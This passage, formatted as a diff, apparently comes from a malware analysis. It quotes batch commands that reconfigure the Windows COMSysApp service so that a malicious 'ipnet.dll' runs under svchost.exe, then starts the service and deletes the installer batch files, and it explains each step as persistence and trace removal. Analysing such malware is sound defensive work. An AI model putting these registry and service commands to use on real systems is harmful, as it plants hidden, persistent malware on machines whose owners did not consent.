@@ -1,0 +1,10 @@
+
+COMSysApp /t
+REG_MULTI_SZ /d \"COMSysApp\"
+/f\r\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v
+ServiceDll /t
+REG_EXPAND_SZ /d
+\"%windir%\\system32\\ ipnet.dll \" /f\r\nsc start COMSysApp\r\ndel /f /q %windir%\\System32\\install1.bat\r\ndel /f /q
+%windir%\\System32\\install2.bat The batch files perform these tasks: Stop the service COMSysApp
+Configure the service to autostart (to set up persistence on the system) Modify registry keys to launch the DLL unser svchost.exe Specify the malicious DLL path to be loaded into the svchost process.
+Immediately restart the service Remove the batch files to reduce the fingerprint on the system IPNet.dll runs as a service under svchost.exe.
